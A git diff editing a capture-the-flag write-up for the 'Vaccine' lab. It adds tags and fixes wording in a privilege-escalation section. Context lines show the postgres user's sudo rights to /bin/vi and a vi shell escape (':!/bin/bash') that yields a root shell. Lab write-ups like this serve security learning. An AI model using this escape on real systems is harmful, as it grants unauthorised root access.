@@ -13,6 +13,10 @@ tags:
   - crackstation
   - password
   - sqlmap
+  - su
+  - shell
+  - PE
+  - vi
 ---
 
 Here are notes from the named target:
@@ -366,7 +370,7 @@ postgres@vaccine:~$
 
 Turns out that is not the correct user.txt but the user account and password for postgres can be used to see privs
 
-This password can be used to view the user's sudo privileges.
+This password can be used to view the user's sudo privileges. *sudo -l*
 
 ```yaml
 postgres@vaccine:~$ sudo -l
@@ -381,13 +385,13 @@ User postgres may run the following commands on vaccine:
 postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ```
 
-VI is run as root so if we open this file and then just close it with 
+**VI is run as root so if we open this file and then just close it with**
 
 ```yaml
 :!/bin/bash
 ```
 
-hit return and it closes and we are not root
+hit return and it closes and we are now root
 
 ```yaml
 root@vaccine:/home# cd /root
